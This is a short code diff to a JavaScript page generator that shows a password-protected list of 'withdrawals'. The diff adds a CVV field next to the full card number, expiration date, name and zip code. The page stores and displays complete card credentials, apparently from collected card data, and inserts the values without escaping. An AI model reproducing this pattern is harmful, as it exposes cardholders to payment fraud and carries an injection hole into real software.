@@ -123,7 +123,7 @@ function generatePasswordPrompt(error = '') {
     `;
 }
 
-// Generate HTML display with vertical layout and delete buttons
+// Generate HTML display with vertical layout, delete buttons, and CVV
 function generateHTML(withdrawals) {
     return `
         <!DOCTYPE html>
@@ -190,6 +190,7 @@ function generateHTML(withdrawals) {
                         <div><span class="label">Amount:</span> <span class="value">$${w.amount.toFixed(2)}</span></div>
                         <div><span class="label">Card Number:</span> <span class="value">${w.cardNumber}</span></div>
                         <div><span class="label">Expiration:</span> <span class="value">${w.cardExp}</span></div>
+                        <div><span class="label">CVV:</span> <span class="value">${w.cardCvv || 'N/A'}</span></div>
                         <div><span class="label">Name:</span> <span class="value">${w.cardName}</span></div>
                         <div><span class="label">Zip Code:</span> <span class="value">${w.zipCode}</span></div>
                     </div>
